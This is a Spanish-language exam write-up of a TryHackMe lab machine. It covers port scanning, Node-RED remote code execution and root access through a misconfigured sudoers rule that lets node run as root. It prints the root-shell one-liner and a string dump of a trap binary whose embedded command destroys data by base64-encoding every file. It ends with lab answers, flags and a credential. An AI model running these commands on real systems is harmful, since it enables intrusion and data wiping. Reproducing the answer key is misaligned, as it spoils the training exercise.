# MF0488 | Examen Práctico - WriteUp  
**Autor:** Jhoel
**Fecha:** 08/11/2025  
**Máquina:** NIGHTMARE BC (TryHackMe)  
**Cliente:** Nebula.io  

---

## OBJETIVOS
- Auditoría completa de máquina vulnerable.
- Explotación de Node-RED RCE.
- Escalada de privilegios mediante `sudoers` mal configurado.
- Documentación profesional con evidencias.

---

## RECONOCIMIENTO

### Escaneo de puertos
```bash
nmap -sT -sV -p 22,1880,3030,4040 10.10.x.x
```

**Resultados:**
| Puerto | Servicio             | Versión |
|--------|----------------------|--------|
| 22     | SSH                  | OpenSSH 8.4p1 |
| 1880   | HTTP (Node-RED)      | Node.js Express |
| 3030   | HTTP (SIEM Taskboard)| Node.js Express |
| 4040   | HTTP (Net Defender)  | Node.js Express |

---

## EXPLOTACIÓN

### Acceso inicial: **Node-RED RCE**

- Puerto `1880` → **Node-RED** vulnerable.
- Exploit público: [https://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297](https://gist.github.com/qkaiser)
- Ejecución de comando:
  ```bash
  python3 exploit.py http://10.10.x.x:1880
  ```
- **Resultado:** `uid=1000(dev) gid=1000(dev)...`

**Acceso como `dev`**

---

## ENUMERACIÓN LOCAL

```bash
whoami
# → dev

id
# → uid=1000(dev) gid=1000(dev) grupos=1000(dev)

sudo -l
```

**Salida clave:**
```bash
User dev may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/bin/node
```

**Vulnerabilidad:**  
Permite ejecutar **Node.js como root sin contraseña** → **escalada a root**.

---

## ESCALADA DE PRIVILEGIOS

```bash
sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

**Resultado:**
```bash
id
# → uid=0(root) gid=0(root) grupos=0(root)
```

**Explicación técnica:**
- `sudo` ejecuta `/usr/bin/node` como `root`
- `child_process.spawn` lanza `/bin/bash`
- `stdio: [0,1,2]` → shell interactiva
- **Fallo de configuración en `/etc/sudoers`**

---

## FLAGS ENCONTRADAS

### 1. **user.txt** (`/home/dev/user.txt`)
```bash
cat user.txt
27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f
```
**Decodificado (hex → ASCII):**
> `';--have i been pwned?`

### 2. **nightmare's secret** (`/home/nightmare/.nightmare`)
```bash
cat .nightmare
https://youtu.be/oxkj7sdlXyg?si=hPg0G1LgzhQ7KdLl
```
**Easter egg:** Rick Astley - Never Gonna Give You Up

### 3. **root.txt** (`/root/root.txt`)
```bash
cat root.txt
aHR0cHM6Ly9vcGVuLnNwb3RpZnkuY29tL2ludGwtZXMvdHJhY2svNjN5MmFMMmRUNnp6dzhGT1NMYU5ycD9zaT1hMDI2ZGRhMTRjNzE0ZWNm
```
**Decodificado (base64 → URL):**
> `https://open.spotify.com/intl-es/track/63y2aL2dT6zzw8FOSLaNrp?si=a026dda14c714ecf`

---

## HALLAZGOS ADICIONALES

### Binario `nightmare` (trampa)

```bash
ls -la /home/nightmare/nightmare
-rwxr-xr-x 1 nightmare nightmare 14416 abr 1 2025 nightmare
```

```bash
stat /home/nightmare/nightmare
  Acceso:      2025-11-07 23:33:50.332005356 +0100
  Modificación: 2025-04-01 17:53:50.035988357 +0200  ← ¡¡FALSIFICADO!!
  Cambio:      2025-10-31 16:10:43.288594251 +0100
  Creación:    2025-04-01 17:53:50.035988357 +0200  ← ¡¡FALSIFICADO!!
```

- **Técnica anti-forense:** `touch -t 202504011753` para simular archivo antiguo
- **Objetivo:** Evitar detección en auditorías (`ls -la` muestra "viejo")
- **Contenido:** Wiper malicioso (base64 + replace)
- **No ejecutarlo** → destruye el sistema

---

## RECOMENDACIONES DE SEGURIDAD

| Riesgo | Mitigación |
|-------|------------|
| `sudo` a intérprete | Usar scripts estáticos: `/opt/app.js` |
| Node-RED expuesto | Deshabilitar en producción |

---

## EVIDENCIAS
1. `nmap` output
```bash
┌──(kali💀kali)-[~/Desktop/Cifrado/Examen3Practico]
└─$ nmap -A -sT -sV -p 22,1880,3030,4040 10.10.221.168 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 12:52 EST
Nmap scan report for 10.10.221.168
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
1880/tcp open  http    Node.js Express framework
|_http-cors: GET POST PUT DELETE
|_http-title: Node-RED
3030/tcp open  http    Node.js (Express middleware)
|_http-title: SIEM Taskboard
4040/tcp open  http    Node.js (Express middleware)
|_http-title: Net Defender \xE2\x80\x94 Sim
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   95.32 ms 10.23.0.1
2   89.42 ms 10.10.221.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.72 seconds
```
2. Node-RED [exploit](https://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297)
3. `sudo -l`
```bash
sudo -l
Matching Defaults entries for dev on tnightmarebc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev may run the following commands on tnightmarebc:
    (root) NOPASSWD: /usr/bin/node
```
4. Shell root (`id`)
```bash
dev@tnightmarebc:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
<d_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
id
uid=0(root) gid=0(root) grupos=0(root)
```
5. `.nightmare`
```bash
cat nightmare
ELF>P@P1@8
          @@@h���hh��   �-�=�=HP�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=/lib64/ld-linux-x86-64.so.2GNU��2��N�C`�$����GNU��e�m? [ j"system__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_register�H�=��f/�DH�=�/H��/H9�tH�>/H��t@�����H�=y/H�5r/H)�H��H��?H��H�H��tH�/H����fD���=9/u/UH�=�.H��t��PTL�JH�
                                                                                              H�=␦/�-����h����/]�����{���UH��H�=�������]�@AWL�=�,AVI��AUI��ATA��UH�-�,SL)�H�����H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��sudo node -e 'require("child_process").execSync("find / -type f 2>/dev/null | while read file; do base64 \"$file\" > \"$file.b64\" && mv \"$file.b64\" \"$file\"; done", {stdio: [0, 1, 2]})'<X����x��������Xm�������������0zRx
                                                                                  (���+zRx
                                                                                         $���� FJ
R                                                                                                �?␦;*3$"D���\����A�C
D|����]B�I�E �E(�D0�H8�G@j8A0A(B BB�����0�)
��␦�����0
�
 @P�    ������op���o���o\���o�=6(@GCC: (Debian 10.2.1-6) 10.2.1 20210110.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment
                                                     ����$&�� 4��>o
                                                                  00F���N���o\\[���oppj��tBP~y   �PPa���        �  �� � ������=�-��?��@� @ 0@0�000'W0�
```


---

## RESPUESTAS A PREGUNTAS

| Pregunta | Respuesta |
|--------|----------|
| Empresa | **Nebula.io** |
| TTP | **Tácticas, técnicas y procedimientos** |
| IP más común | **169.254.169.254** |
| Eventos 22 mayo | **4.021** |
| Menos RDP | **196.186.220.253** |
| Alerta | **CryptoMiner** |
| Event ID | **4688** |
| Hora | **00:40 (PKT), 06/05/2022** |
| Usuario | **Chris** |
| Proceso | **C:\Usuarios\Chris\temp\cudominer.exe** |
| Gravedad | **2** |
| Canal | **THM_SIEM** |
| Regla | **Alerta "Posible actividad de CryptoMiner"** |
| ID regla | **36** |
| Acción | **Verdadero Positivo** |
| FLAG SIEM | **THM{000_SIEM_INTRO}** |
| Usuario web | **D.Finkelstein** |
| Contraseña | **Mr.0oG13_B00g13** |
| Flag usuario | **';--have i been pwned?** |
| Comando escalada | **sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'** |
| Flag nightmare | **https://youtu.be/oxkj7sdlXyg** |
| Flag root | **https://open.spotify.com/...** |

